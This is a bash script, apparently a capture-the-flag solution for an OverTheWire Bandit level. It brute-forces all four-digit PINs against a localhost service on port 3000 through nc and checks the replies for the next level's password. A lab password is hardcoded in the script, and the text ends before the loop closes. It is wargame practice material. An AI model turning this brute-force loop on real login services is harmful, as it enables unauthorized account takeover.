#! /bin/bash

counter=0
rm /tmp/res

for i in {0..9}{0..9}{0..9}{0..9}; do
    	(( counter++ ))
   if(( counter > 1000 )); then
       
           
           echo "sending 1000 attempts to nc and writing to /tmp/res"
	cat /tmp/tmpFile | nc localhost 3000  >>/tmp/res
	
            if (cat /tmp/res | grep "The password of user bandit25 is");then 
             break
            fi


           
            echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" > /tmp/tmpFile 
	let counter=0
	echo "$counter"

   else
       	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> /tmp/tmpFile
       
   fi
